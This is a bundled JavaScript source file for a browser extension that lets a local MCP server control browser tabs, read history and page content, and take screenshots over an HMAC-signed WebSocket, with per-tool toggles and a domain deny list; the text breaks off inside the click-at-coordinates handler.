"use strict";
(() => {
  // auth.ts
  function buf2hex(buffer) {
    return Array.from(new Uint8Array(buffer)).map((x) => x.toString(16).padStart(2, "0")).join("");
  }
  async function getMessageSignature(message, secretKey) {
    if (secretKey.length === 0) {
      throw new Error("Secret key is empty");
    }
    const encoder = new TextEncoder();
    const keyData = encoder.encode(secretKey);
    const messageData = encoder.encode(message);
    const key = await crypto.subtle.importKey(
      "raw",
      keyData,
      { name: "HMAC", hash: "SHA-256" },
      false,
      ["sign"]
    );
    const rawSignature = await crypto.subtle.sign(
      { name: "HMAC" },
      key,
      messageData
    );
    return buf2hex(rawSignature);
  }

  // client.ts
  var WebsocketClient = class {
    socket = null;
    port;
    secret;
    reconnectInterval = 2e3;
    // 2 seconds
    reconnectTimer = null;
    messageCallback = null;
    constructor(port, secret) {
      this.port = port;
      this.secret = secret;
    }
    connect() {
      console.log("Connecting to WebSocket server");
      this.socket = new WebSocket(`ws://localhost:${this.port}`);
      this.socket.addEventListener("open", () => {
        console.log("Connected to WebSocket server at port", this.port);
      });
      this.socket.addEventListener("close", () => {
        this.socket = null;
      });
      this.socket.addEventListener("error", (event) => {
        console.error("WebSocket error:", event);
        this.socket && this.socket.close();
      });
      this.socket.addEventListener("message", async (event) => {
        if (this.messageCallback === null) {
          return;
        }
        try {
          const signedMessage = JSON.parse(event.data);
          const messageSig = await getMessageSignature(
            JSON.stringify(signedMessage.payload),
            this.secret
          );
          if (messageSig.length === 0 || messageSig !== signedMessage.signature) {
            console.error("Invalid message signature");
            await this.sendErrorToServer(
              signedMessage.payload.correlationId,
              "Invalid message signature - extension and server not in sync"
            );
            return;
          }
          this.messageCallback(signedMessage.payload);
        } catch (error) {
          console.error("Failed to parse message:", error);
        }
      });
      if (this.reconnectTimer === null) {
        this.startReconnectTimer();
      }
    }
    addMessageListener(callback) {
      this.messageCallback = callback;
    }
    startReconnectTimer() {
      this.reconnectTimer = window.setInterval(() => {
        if (!this.socket || this.socket.readyState === WebSocket.CLOSED) {
          this.connect();
        }
      }, this.reconnectInterval);
    }
    async sendResourceToServer(resource) {
      if (!this.socket || this.socket.readyState !== WebSocket.OPEN) {
        console.error("Socket is not open");
        return;
      }
      const signedMessage = {
        payload: resource,
        signature: await getMessageSignature(
          JSON.stringify(resource),
          this.secret
        )
      };
      this.socket.send(JSON.stringify(signedMessage));
    }
    async sendErrorToServer(correlationId, errorMessage) {
      if (!this.socket || this.socket.readyState !== WebSocket.OPEN) {
        console.error("Socket is not open");
        return;
      }
      const extensionError = {
        correlationId,
        errorMessage
      };
      this.socket.send(JSON.stringify(extensionError));
    }
    disconnect() {
      if (this.reconnectTimer !== null) {
        window.clearInterval(this.reconnectTimer);
        this.reconnectTimer = null;
      }
      if (this.socket) {
        this.socket.close();
        this.socket = null;
      }
    }
  };

  // extension-config.ts
  var AVAILABLE_TOOLS = [
    {
      id: "open-browser-tab",
      name: "Open Browser Tab",
      description: "Allows the MCP server to open new browser tabs"
    },
    {
      id: "close-browser-tabs",
      name: "Close Browser Tabs",
      description: "Allows the MCP server to close browser tabs"
    },
    {
      id: "get-list-of-open-tabs",
      name: "Get List of Open Tabs",
      description: "Allows the MCP server to get a list of all open tabs"
    },
    {
      id: "get-recent-browser-history",
      name: "Get Recent Browser History",
      description: "Allows the MCP server to access your recent browsing history"
    },
    {
      id: "get-tab-web-content",
      name: "Get Tab Web Content",
      description: "Allows the MCP server to read the content of web pages"
    },
    {
      id: "reorder-browser-tabs",
      name: "Reorder Browser Tabs",
      description: "Allows the MCP server to change the order of your browser tabs"
    },
    {
      id: "find-highlight-in-browser-tab",
      name: "Find and Highlight in Browser Tab",
      description: "Allows the MCP server to search for and highlight text in web pages"
    },
    {
      id: "take-screenshot",
      name: "Take Screenshot",
      description: "Allows the MCP server to capture screenshots of browser tabs"
    },
    {
      id: "click-at-coordinates",
      name: "Click at Coordinates",
      description: "Allows the MCP server to click at specific coordinates on web pages"
    },
    {
      id: "click-element",
      name: "Click Element",
      description: "Allows the MCP server to click on specific elements using CSS selectors"
    }
  ];
  var COMMAND_TO_TOOL_ID = {
    "open-tab": "open-browser-tab",
    "close-tabs": "close-browser-tabs",
    "get-tab-list": "get-list-of-open-tabs",
    "get-browser-recent-history": "get-recent-browser-history",
    "get-tab-content": "get-tab-web-content",
    "reorder-tabs": "reorder-browser-tabs",
    "find-highlight": "find-highlight-in-browser-tab",
    "take-screenshot": "take-screenshot",
    "click-at-coordinates": "click-at-coordinates",
    "click-element": "click-element"
  };
  function getDefaultToolSettings() {
    const settings = {};
    AVAILABLE_TOOLS.forEach((tool) => {
      settings[tool.id] = true;
    });
    return settings;
  }
  function getDefaultScreenshotConfig() {
    return {
      defaultFormat: "png",
      defaultQuality: 90,
      maxWidth: 1920,
      maxHeight: 1080
    };
  }
  async function getConfig() {
    const configObj = await browser.storage.local.get("config");
    const config = configObj.config || { secret: "" };
    if (!config.toolSettings) {
      config.toolSettings = getDefaultToolSettings();
    }
    if (!config.screenshotConfig) {
      config.screenshotConfig = getDefaultScreenshotConfig();
    }
    return config;
  }
  async function saveConfig(config) {
    await browser.storage.local.set({ config });
  }
  async function generateSecret() {
    const config = await getConfig();
    config.secret = crypto.randomUUID();
    await saveConfig(config);
    return config.secret;
  }
  async function isToolEnabled(toolId) {
    const config = await getConfig();
    return config.toolSettings?.[toolId] !== false;
  }
  async function isCommandAllowed(command) {
    const toolId = COMMAND_TO_TOOL_ID[command];
    if (!toolId) {
      console.error(`Unknown command: ${command}`);
      return false;
    }
    return isToolEnabled(toolId);
  }
  async function getDomainDenyList() {
    const config = await getConfig();
    return config.domainDenyList || [];
  }
  async function isDomainInDenyList(url) {
    try {
      const urlObj = new URL(url);
      const domain = urlObj.hostname;
      const denyList = await getDomainDenyList();
      return denyList.some(
        (deniedDomain) => domain.toLowerCase() === deniedDomain.toLowerCase() || domain.toLowerCase().endsWith(`.${deniedDomain.toLowerCase()}`)
      );
    } catch (error) {
      console.error(`Error checking domain in deny list: ${error}`);
      return false;
    }
  }
  async function getScreenshotConfig() {
    const config = await getConfig();
    return config.screenshotConfig || getDefaultScreenshotConfig();
  }

  // message-handler.ts
  var MessageHandler = class {
    client;
    constructor(client) {
      this.client = client;
    }
    async handleDecodedMessage(req) {
      const isAllowed = await isCommandAllowed(req.cmd);
      if (!isAllowed) {
        throw new Error(`Command '${req.cmd}' is disabled in extension settings`);
      }
      switch (req.cmd) {
        case "open-tab":
          await this.openUrl(req.correlationId, req.url);
          break;
        case "close-tabs":
          await this.closeTabs(req.correlationId, req.tabIds);
          break;
        case "get-tab-list":
          await this.sendTabs(req.correlationId);
          break;
        case "get-browser-recent-history":
          await this.sendRecentHistory(req.correlationId, req.searchQuery);
          break;
        case "get-tab-content":
          await this.sendTabsContent(req.correlationId, req.tabId, req.offset);
          break;
        case "reorder-tabs":
          await this.reorderTabs(req.correlationId, req.tabOrder);
          break;
        case "find-highlight":
          await this.findAndHighlightText(
            req.correlationId,
            req.tabId,
            req.queryPhrase
          );
          break;
        case "take-screenshot":
          await this.takeScreenshot(
            req.correlationId,
            req.tabId,
            req.format,
            req.quality
          );
          break;
        case "scroll-to-position":
          await this.scrollToCoordinates(
            req.correlationId,
            req.tabId,
            req.x,
            req.y,
            req.behavior
          );
          break;
        case "scroll-by-offset":
          await this.scrollByOffset(
            req.correlationId,
            req.tabId,
            req.deltaX,
            req.deltaY,
            req.behavior
          );
          break;
        case "scroll-to-element":
          await this.scrollToElement(
            req.correlationId,
            req.tabId,
            req.selector,
            req.block,
            req.inline,
            req.behavior
          );
          break;
        case "click-at-coordinates":
          await this.clickAtCoordinates(
            req.correlationId,
            req.tabId,
            req.x,
            req.y,
            req.button,
            req.clickType,
            req.modifiers
          );
          break;
        case "click-element":
          await this.clickElement(
            req.correlationId,
            req.tabId,
            req.selector,
            req.button,
            req.clickType,
            req.waitForElement,
            req.scrollIntoView,
            req.modifiers
          );
          break;
        case "hover-element":
          await this.hoverElement(
            req.correlationId,
            req.tabId,
            req.selector,
            req.x,
            req.y,
            req.waitForElement
          );
          break;
        case "type-text":
          await this.typeText(
            req.correlationId,
            req.tabId,
            req.text,
            req.selector,
            req.clearFirst,
            req.typeDelay,
            req.waitForElement
          );
          break;
        case "send-special-keys":
          await this.sendSpecialKeys(
            req.correlationId,
            req.tabId,
            req.keys,
            req.selector,
            req.modifiers
          );
          break;
        case "clear-input-field":
          await this.clearInputField(
            req.correlationId,
            req.tabId,
            req.selector,
            req.waitForElement
          );
          break;
        case "wait-for-time":
          await this.waitForTime(
            req.correlationId,
            req.duration,
            req.message
          );
          break;
        case "wait-for-element":
          await this.waitForElement(
            req.correlationId,
            req.tabId,
            req.selector,
            req.timeout,
            req.pollInterval,
            req.visible
          );
          break;
        case "wait-for-element-visibility":
          await this.waitForElementVisibility(
            req.correlationId,
            req.tabId,
            req.selector,
            req.timeout,
            req.threshold
          );
          break;
        case "wait-for-condition":
          await this.client.sendErrorToServer(
            req.correlationId,
            "wait-for-condition feature has been disabled for security reasons. This feature previously allowed arbitrary JavaScript execution which poses a critical security risk. Use specific wait operations like wait-for-element or wait-for-element-visibility instead."
          );
          break;
        default:
          const _exhaustiveCheck = req;
          console.error("Invalid message received:", req);
      }
    }
    async openUrl(correlationId, url) {
      if (!url.startsWith("https://")) {
        console.error("Invalid URL:", url);
        throw new Error("Invalid URL");
      }
      if (await isDomainInDenyList(url)) {
        throw new Error("Domain in user defined deny list");
      }
      const tab = await browser.tabs.create({
        url
      });
      await this.client.sendResourceToServer({
        resource: "opened-tab-id",
        correlationId,
        tabId: tab.id
      });
    }
    async closeTabs(correlationId, tabIds) {
      await browser.tabs.remove(tabIds);
      await this.client.sendResourceToServer({
        resource: "tabs-closed",
        correlationId
      });
    }
    async sendTabs(correlationId) {
      const tabs = await browser.tabs.query({});
      await this.client.sendResourceToServer({
        resource: "tabs",
        correlationId,
        tabs
      });
    }
    async sendRecentHistory(correlationId, searchQuery = null) {
      const historyItems = await browser.history.search({
        text: searchQuery ?? "",
        // Search for all URLs (empty string matches everything)
        maxResults: 200,
        // Limit to 200 results
        startTime: 0
        // Search from the beginning of time
      });
      const filteredHistoryItems = historyItems.filter((item) => {
        return !!item.url;
      });
      await this.client.sendResourceToServer({
        resource: "history",
        correlationId,
        historyItems: filteredHistoryItems
      });
    }
    async sendTabsContent(correlationId, tabId, offset) {
      const tab = await browser.tabs.get(tabId);
      if (tab.url && await isDomainInDenyList(tab.url)) {
        throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
      }
      const MAX_CONTENT_LENGTH = 5e4;
      const results = await browser.scripting.executeScript({
        target: { tabId },
        func: (offset2, maxLength) => {
          function getLinks() {
            const linkElements = document.querySelectorAll("a[href]");
            return Array.from(linkElements).map((el) => {
              const anchor = el;
              return {
                url: anchor.href,
                text: anchor.innerText.trim() || anchor.getAttribute("aria-label") || anchor.getAttribute("title") || ""
              };
            }).filter((link) => link.text !== "" && link.url.startsWith("https://") && !link.url.includes("#"));
          }
          function getTextContent() {
            let isTruncated2 = false;
            let text = document.body.innerText.substring(offset2 || 0);
            if (text.length > maxLength) {
              text = text.substring(0, maxLength);
              isTruncated2 = true;
            }
            return {
              text,
              isTruncated: isTruncated2
            };
          }
          const textContent = getTextContent();
          return {
            links: getLinks(),
            fullText: textContent.text,
            isTruncated: textContent.isTruncated,
            totalLength: document.body.innerText.length
          };
        },
        args: [offset || 0, MAX_CONTENT_LENGTH]
      });
      const { isTruncated, fullText, links, totalLength } = results[0].result;
      await this.client.sendResourceToServer({
        resource: "tab-content",
        tabId,
        correlationId,
        isTruncated,
        fullText,
        links,
        totalLength
      });
    }
    async reorderTabs(correlationId, tabOrder) {
      for (let newIndex = 0; newIndex < tabOrder.length; newIndex++) {
        const tabId = tabOrder[newIndex];
        await browser.tabs.move(tabId, { index: newIndex });
      }
      await this.client.sendResourceToServer({
        resource: "tabs-reordered",
        correlationId,
        tabOrder
      });
    }
    async findAndHighlightText(correlationId, tabId, queryPhrase) {
      const findResults = await browser.find.find(queryPhrase, {
        tabId,
        caseSensitive: true
      });
      if (findResults.count > 0) {
        await browser.tabs.update(tabId, { active: true });
        browser.find.highlightResults({
          tabId
        });
      }
      await this.client.sendResourceToServer({
        resource: "find-highlight-result",
        correlationId,
        noOfResults: findResults.count
      });
    }
    async takeScreenshot(correlationId, tabId, format, quality) {
      try {
        if (!Number.isInteger(tabId) || tabId < 0) {
          throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
        }
        if (format && !["png", "jpeg"].includes(format)) {
          throw new Error(`Invalid format: ${format}. Must be 'png' or 'jpeg'.`);
        }
        if (quality !== void 0 && (!Number.isInteger(quality) || quality < 0 || quality > 100)) {
          throw new Error(`Invalid quality: ${quality}. Quality must be an integer between 0 and 100.`);
        }
        const screenshotConfig = await getScreenshotConfig();
        const finalFormat = format || screenshotConfig.defaultFormat;
        const finalQuality = quality || screenshotConfig.defaultQuality;
        let tab;
        try {
          tab = await browser.tabs.get(tabId);
        } catch (tabError) {
          throw new Error(`Tab with ID ${tabId} not found or is not accessible. The tab may have been closed or does not exist.`);
        }
        if (!tab) {
          throw new Error(`Tab with ID ${tabId} not found`);
        }
        if (tab.status !== "complete") {
          throw new Error(`Tab ${tabId} is still loading. Please wait for the page to finish loading before taking a screenshot.`);
        }
        if (!tab.url) {
          throw new Error(`Tab ${tabId} does not have a valid URL`);
        }
        if (tab.url.startsWith("about:") || tab.url.startsWith("moz-extension:") || tab.url.startsWith("chrome:")) {
          throw new Error(`Cannot capture screenshot of system page: ${tab.url}`);
        }
        if (await isDomainInDenyList(tab.url)) {
          throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
        }
        const windowId = tab.windowId;
        if (windowId === void 0 || windowId < 0) {
          throw new Error(`Tab ${tabId} does not have a valid window ID`);
        }
        try {
          const window2 = await browser.windows.get(windowId);
          if (!window2) {
            throw new Error(`Window ${windowId} not found`);
          }
          if (window2.state === "minimized") {
            throw new Error(`Cannot capture screenshot: window ${windowId} is minimized`);
          }
        } catch (windowError) {
          throw new Error(`Window ${windowId} is not accessible: ${windowError instanceof Error ? windowError.message : "Unknown error"}`);
        }
        const imageDataUrl = await this.captureFullPageScreenshot(tabId, windowId, finalFormat, finalQuality);
        const base64Data = imageDataUrl.split(",")[1];
        if (!base64Data) {
          throw new Error("Failed to extract base64 data from captured image");
        }
        if (base64Data.length < 100) {
          throw new Error("Captured image data appears to be too small or corrupted");
        }
        await this.client.sendResourceToServer({
          resource: "screenshot",
          correlationId,
          tabId,
          imageData: base64Data,
          format: finalFormat,
          timestamp: Date.now()
        });
      } catch (error) {
        console.error("Screenshot capture failed:", error);
        if (error instanceof Error && (error.message.includes("Tab") || error.message.includes("Window") || error.message.includes("Permission"))) {
          throw error;
        }
        throw new Error(`Failed to capture screenshot: ${error instanceof Error ? error.message : "Unknown error"}`);
      }
    }
    async captureFullPageScreenshot(tabId, windowId, format, quality) {
      const MAX_PAGE_HEIGHT = 6e3;
      try {
        const pageDimensions = await this.getPageDimensions(tabId);
        const captureHeight = Math.min(pageDimensions.fullHeight, MAX_PAGE_HEIGHT);
        if (captureHeight <= pageDimensions.viewportHeight) {
          return await this.captureSingleScreenshot(windowId, format, quality, tabId);
        }
        const originalScrollY = await this.getCurrentScrollPosition(tabId);
        try {
          const viewportHeight = pageDimensions.viewportHeight;
          const numCaptures = Math.ceil(captureHeight / viewportHeight);
          const screenshots = [];
          for (let i = 0; i < numCaptures; i++) {
            const scrollY = i * viewportHeight;
            if (scrollY >= captureHeight) break;
            await this.scrollToPosition(tabId, scrollY);
            await this.waitForScrollComplete(tabId, 300);
            const screenshot = await this.captureSingleScreenshot(windowId, format, quality, tabId);
            screenshots.push(screenshot);
          }
          if (screenshots.length === 1) {
            return screenshots[0];
          }
          return await this.stitchScreenshots(screenshots, viewportHeight, captureHeight, tabId);
        } finally {
          try {
            await this.scrollToPosition(tabId, originalScrollY);
            await this.waitForScrollComplete(tabId, 100);
          } catch (restoreError) {
            console.warn("Failed to restore original scroll position:", restoreError);
          }
        }
      } catch (error) {
        console.error("Full page capture failed, falling back to viewport capture:", error);
        try {
          return await this.captureSingleScreenshot(windowId, format, quality, tabId);
        } catch (fallbackError) {
          throw new Error(`Both full page and fallback screenshot capture failed: ${error instanceof Error ? error.message : "Unknown error"}`);
        }
      }
    }
    async getPageDimensions(tabId) {
      const results = await browser.scripting.executeScript({
        target: { tabId },
        func: () => {
          const body = document.body;
          const html = document.documentElement;
          const fullHeight = Math.max(
            body.scrollHeight,
            body.offsetHeight,
            html.clientHeight,
            html.scrollHeight,
            html.offsetHeight
          );
          const viewportHeight = window.innerHeight;
          const viewportWidth = window.innerWidth;
          return {
            fullHeight,
            viewportHeight,
            viewportWidth
          };
        }
      });
      return results[0].result;
    }
    async getCurrentScrollPosition(tabId) {
      const results = await browser.scripting.executeScript({
        target: { tabId },
        func: () => window.pageYOffset || document.documentElement.scrollTop
      });
      return results[0].result || 0;
    }
    async scrollToPosition(tabId, scrollY) {
      await browser.scripting.executeScript({
        target: { tabId },
        func: (scrollY2) => {
          window.scrollTo({
            top: scrollY2,
            left: 0,
            behavior: "instant"
          });
        },
        args: [scrollY]
      });
    }
    async waitForScrollComplete(tabId, delay = 300) {
      await new Promise((resolve) => setTimeout(resolve, delay));
      await browser.scripting.executeScript({
        target: { tabId },
        func: () => {
          const images = document.querySelectorAll('img[loading="lazy"], img[data-src]');
          const promises = Array.from(images).map((img) => {
            const imageElement = img;
            if (imageElement.complete) return Promise.resolve();
            return new Promise((resolve) => {
              imageElement.onload = imageElement.onerror = resolve;
              setTimeout(resolve, 1e3);
            });
          });
          return Promise.all(promises);
        }
      });
    }
    async captureSingleScreenshot(windowId, format, quality, targetTabId) {
      if (targetTabId !== void 0) {
        try {
          const tab = await browser.tabs.get(targetTabId);
          if (!tab) {
            throw new Error(`Target tab ${targetTabId} not found`);
          }
          if (tab.windowId !== windowId) {
            throw new Error(`Target tab ${targetTabId} is not in window ${windowId}`);
          }
        } catch (tabError) {
          throw new Error(`Target tab ${targetTabId} not found or is not accessible`);
        }
      }
      const captureOptions = { format };
      if (format === "jpeg") {
        captureOptions.quality = Math.max(0, Math.min(100, quality));
      }
      try {
        const capturePromise = browser.tabs.captureVisibleTab(windowId, captureOptions);
        const timeoutPromise = new Promise((_, reject) => {
          setTimeout(() => reject(new Error("Screenshot capture timed out after 10 seconds")), 1e4);
        });
        const imageDataUrl = await Promise.race([capturePromise, timeoutPromise]);
        if (!imageDataUrl || !imageDataUrl.startsWith("data:image/")) {
          throw new Error("Invalid image data received from capture operation");
        }
        return imageDataUrl;
      } catch (error) {
        throw error;
      }
    }
    async stitchScreenshots(screenshots, viewportHeight, totalHeight, targetTabId) {
      if (screenshots.length === 1) {
        return screenshots[0];
      }
      try {
        const result = await this.executeStitchingInContentScript(screenshots, totalHeight, targetTabId);
        return result;
      } catch (error) {
        console.error("Content script stitching failed, falling back to simple concatenation:", error);
        return screenshots[0];
      }
    }
    async executeStitchingInContentScript(screenshots, totalHeight, targetTabId) {
      let tab;
      try {
        tab = await browser.tabs.get(targetTabId);
      } catch (tabError) {
        throw new Error(`Target tab ${targetTabId} not found or is not accessible for stitching operation`);
      }
      if (!tab) {
        throw new Error(`Target tab ${targetTabId} not found`);
      }
      if (tab.status !== "complete") {
        throw new Error(`Target tab ${targetTabId} is still loading. Cannot execute stitching script.`);
      }
      const tabId = targetTabId;
      const stitchingCode = `
      (function() {
        const screenshots = ${JSON.stringify(screenshots)};
        const totalHeight = ${totalHeight};
        
        return new Promise((resolve, reject) => {
          try {
            // Load the first image to get dimensions
            const firstImg = new Image();
            firstImg.onload = function() {
              const width = firstImg.width;
              
              // Create canvas in DOM context (available in content scripts)
              const canvas = document.createElement('canvas');
              canvas.width = width;
              canvas.height = totalHeight;
              const ctx = canvas.getContext('2d');
              
              if (!ctx) {
                reject(new Error('Failed to get canvas context'));
                return;
              }
              
              let currentY = 0;
              let loadedImages = 0;
              const images = [];
              
              // Load all images first
              for (let i = 0; i < screenshots.length; i++) {
                const img = new Image();
                img.onload = function() {
                  images[i] = img;
                  loadedImages++;
                  
                  // When all images are loaded, stitch them
                  if (loadedImages === screenshots.length) {
                    try {
                      currentY = 0;
                      for (let j = 0; j < images.length; j++) {
                        const image = images[j];
                        const remainingHeight = totalHeight - currentY;
                        const imageHeight = Math.min(image.height, remainingHeight);
                        
                        if (imageHeight <= 0) break;
                        
                        ctx.drawImage(
                          image,
                          0, 0, width, imageHeight,
                          0, currentY, width, imageHeight
                        );
                        
                        currentY += imageHeight;
                        if (currentY >= totalHeight) break;
                      }
                      
                      // Convert to data URL
                      const dataUrl = canvas.toDataURL('image/png');
                      resolve(dataUrl);
                    } catch (error) {
                      reject(error);
                    }
                  }
                };
                img.onerror = () => reject(new Error(\`Failed to load image \${i}\`));
                img.src = screenshots[i];
              }
            };
            firstImg.onerror = () => reject(new Error('Failed to load first image'));
            firstImg.src = screenshots[0];
          } catch (error) {
            reject(error);
          }
        });
      })();
    `;
      const results = await browser.scripting.executeScript({
        target: { tabId },
        func: (screenshots2, totalHeight2) => {
          return new Promise((resolve, reject) => {
            try {
              const firstImg = new Image();
              firstImg.onload = function() {
                const width = firstImg.width;
                const canvas = document.createElement("canvas");
                canvas.width = width;
                canvas.height = totalHeight2;
                const ctx = canvas.getContext("2d");
                if (!ctx) {
                  reject(new Error("Failed to get canvas context"));
                  return;
                }
                let currentY = 0;
                let loadedImages = 0;
                const images = [];
                for (let i = 0; i < screenshots2.length; i++) {
                  const img = new Image();
                  img.onload = function() {
                    images[i] = img;
                    loadedImages++;
                    if (loadedImages === screenshots2.length) {
                      try {
                        currentY = 0;
                        for (let j = 0; j < images.length; j++) {
                          const image = images[j];
                          const remainingHeight = totalHeight2 - currentY;
                          const imageHeight = Math.min(image.height, remainingHeight);
                          if (imageHeight <= 0) break;
                          ctx.drawImage(
                            image,
                            0,
                            0,
                            width,
                            imageHeight,
                            0,
                            currentY,
                            width,
                            imageHeight
                          );
                          currentY += imageHeight;
                          if (currentY >= totalHeight2) break;
                        }
                        const dataUrl = canvas.toDataURL("image/png");
                        resolve(dataUrl);
                      } catch (error) {
                        reject(error);
                      }
                    }
                  };
                  img.onerror = () => reject(new Error(`Failed to load image ${i}`));
                  img.src = screenshots2[i];
                }
              };
              firstImg.onerror = () => reject(new Error("Failed to load first image"));
              firstImg.src = screenshots2[0];
            } catch (error) {
              reject(error);
            }
          });
        },
        args: [screenshots, totalHeight]
      });
      if (!results || !results[0]) {
        throw new Error("Stitching script execution failed");
      }
      return results[0].result;
    }
    async loadImage(dataUrl) {
      return new Promise((resolve, reject) => {
        const img = new Image();
        img.onload = () => resolve(img);
        img.onerror = () => reject(new Error("Failed to load image"));
        img.src = dataUrl;
      });
    }
    async scrollToCoordinates(correlationId, tabId, x = 0, y, behavior = "smooth") {
      try {
        if (!Number.isInteger(tabId) || tabId < 0) {
          throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
        }
        if (!Number.isInteger(x) || x < 0) {
          throw new Error(`Invalid x coordinate: ${x}. X coordinate must be a non-negative integer.`);
        }
        if (!Number.isInteger(y) || y < 0) {
          throw new Error(`Invalid y coordinate: ${y}. Y coordinate must be a non-negative integer.`);
        }
        const tab = await browser.tabs.get(tabId);
        if (!tab || tab.status !== "complete") {
          throw new Error(`Tab ${tabId} not found or not ready`);
        }
        if (tab.url && await isDomainInDenyList(tab.url)) {
          throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
        }
        const results = await browser.scripting.executeScript({
          target: { tabId },
          func: (x2, y2, behavior2) => {
            return new Promise((resolve) => {
              try {
                window.scrollTo({
                  top: y2,
                  left: x2,
                  behavior: behavior2
                });
                const checkPosition = () => {
                  const finalX = window.pageXOffset || document.documentElement.scrollLeft;
                  const finalY = window.pageYOffset || document.documentElement.scrollTop;
                  resolve({
                    success: true,
                    finalPosition: { x: finalX, y: finalY },
                    message: "Scrolled to position successfully"
                  });
                };
                if (behavior2 === "smooth") {
                  setTimeout(checkPosition, 500);
                } else {
                  checkPosition();
                }
              } catch (error) {
                resolve({
                  success: false,
                  finalPosition: { x: window.pageXOffset || 0, y: window.pageYOffset || 0 },
                  message: "Scroll failed: " + error.message
                });
              }
            });
          },
          args: [x, y, behavior]
        });
        const result = results[0].result;
        await this.client.sendResourceToServer({
          resource: "scroll-result",
          correlationId,
          success: result.success,
          finalPosition: result.finalPosition,
          message: result.message,
          timestamp: Date.now()
        });
      } catch (error) {
        console.error("Scroll to position failed:", error);
        await this.client.sendResourceToServer({
          resource: "scroll-result",
          correlationId,
          success: false,
          finalPosition: { x: 0, y: 0 },
          message: `Scroll failed: ${error instanceof Error ? error.message : "Unknown error"}`,
          timestamp: Date.now()
        });
      }
    }
    async scrollByOffset(correlationId, tabId, deltaX = 0, deltaY, behavior = "smooth") {
      try {
        if (!Number.isInteger(tabId) || tabId < 0) {
          throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
        }
        if (!Number.isInteger(deltaX)) {
          throw new Error(`Invalid deltaX: ${deltaX}. DeltaX must be an integer.`);
        }
        if (!Number.isInteger(deltaY)) {
          throw new Error(`Invalid deltaY: ${deltaY}. DeltaY must be an integer.`);
        }
        const tab = await browser.tabs.get(tabId);
        if (!tab || tab.status !== "complete") {
          throw new Error(`Tab ${tabId} not found or not ready`);
        }
        if (tab.url && await isDomainInDenyList(tab.url)) {
          throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
        }
        const results = await browser.scripting.executeScript({
          target: { tabId },
          func: (deltaX2, deltaY2, behavior2) => {
            return new Promise((resolve) => {
              try {
                window.scrollBy({
                  top: deltaY2,
                  left: deltaX2,
                  behavior: behavior2
                });
                const checkPosition = () => {
                  const finalX = window.pageXOffset || document.documentElement.scrollLeft;
                  const finalY = window.pageYOffset || document.documentElement.scrollTop;
                  resolve({
                    success: true,
                    finalPosition: { x: finalX, y: finalY },
                    message: "Scrolled by offset successfully"
                  });
                };
                if (behavior2 === "smooth") {
                  setTimeout(checkPosition, 500);
                } else {
                  checkPosition();
                }
              } catch (error) {
                resolve({
                  success: false,
                  finalPosition: { x: window.pageXOffset || 0, y: window.pageYOffset || 0 },
                  message: "Scroll failed: " + error.message
                });
              }
            });
          },
          args: [deltaX, deltaY, behavior]
        });
        const result = results[0].result;
        await this.client.sendResourceToServer({
          resource: "scroll-result",
          correlationId,
          success: result.success,
          finalPosition: result.finalPosition,
          message: result.message,
          timestamp: Date.now()
        });
      } catch (error) {
        console.error("Scroll by offset failed:", error);
        await this.client.sendResourceToServer({
          resource: "scroll-result",
          correlationId,
          success: false,
          finalPosition: { x: 0, y: 0 },
          message: `Scroll failed: ${error instanceof Error ? error.message : "Unknown error"}`,
          timestamp: Date.now()
        });
      }
    }
    async scrollToElement(correlationId, tabId, selector, block = "center", inline = "nearest", behavior = "smooth") {
      try {
        if (!Number.isInteger(tabId) || tabId < 0) {
          throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
        }
        if (!selector || typeof selector !== "string") {
          throw new Error(`Invalid selector: selector must be a non-empty string.`);
        }
        if (selector.includes("<") || selector.includes(">") || selector.includes("script")) {
          throw new Error(`Invalid selector: potentially dangerous characters detected.`);
        }
        const tab = await browser.tabs.get(tabId);
        if (!tab || tab.status !== "complete") {
          throw new Error(`Tab ${tabId} not found or not ready`);
        }
        if (tab.url && await isDomainInDenyList(tab.url)) {
          throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
        }
        const results = await browser.scripting.executeScript({
          target: { tabId },
          func: (selector2, behavior2, block2, inline2) => {
            return new Promise((resolve) => {
              try {
                const element = document.querySelector(selector2);
                if (!element) {
                  resolve({
                    success: false,
                    finalPosition: {
                      x: window.pageXOffset || document.documentElement.scrollLeft,
                      y: window.pageYOffset || document.documentElement.scrollTop
                    },
                    message: `Element not found with selector: ${selector2}`
                  });
                  return;
                }
                element.scrollIntoView({
                  behavior: behavior2,
                  block: block2,
                  inline: inline2
                });
                const checkPosition = () => {
                  const finalX = window.pageXOffset || document.documentElement.scrollLeft;
                  const finalY = window.pageYOffset || document.documentElement.scrollTop;
                  resolve({
                    success: true,
                    finalPosition: { x: finalX, y: finalY },
                    message: "Scrolled to element successfully"
                  });
                };
                if (behavior2 === "smooth") {
                  setTimeout(checkPosition, 500);
                } else {
                  checkPosition();
                }
              } catch (error) {
                resolve({
                  success: false,
                  finalPosition: {
                    x: window.pageXOffset || document.documentElement.scrollLeft || 0,
                    y: window.pageYOffset || document.documentElement.scrollTop || 0
                  },
                  message: "Scroll failed: " + error.message
                });
              }
            });
          },
          args: [selector, behavior, block, inline]
        });
        const result = results[0].result;
        await this.client.sendResourceToServer({
          resource: "scroll-result",
          correlationId,
          success: result.success,
          finalPosition: result.finalPosition,
          message: result.message,
          timestamp: Date.now()
        });
      } catch (error) {
        console.error("Scroll to element failed:", error);
        await this.client.sendResourceToServer({
          resource: "scroll-result",
          correlationId,
          success: false,
          finalPosition: { x: 0, y: 0 },
          message: `Scroll failed: ${error instanceof Error ? error.message : "Unknown error"}`,
          timestamp: Date.now()
        });
      }
    }
    async clickAtCoordinates(correlationId, tabId, x, y, button = "left", clickType = "single", modifiers = {}) {
      try {
        if (!Number.isInteger(tabId) || tabId < 0) {
          throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
        }
        if (!Number.isInteger(x) || x < 0) {
          throw new Error(`Invalid x coordinate: ${x}. X coordinate must be a non-negative integer.`);
        }
        if (!Number.isInteger(y) || y < 0) {
          throw new Error(`Invalid y coordinate: ${y}. Y coordinate must be a non-negative integer.`);
        }
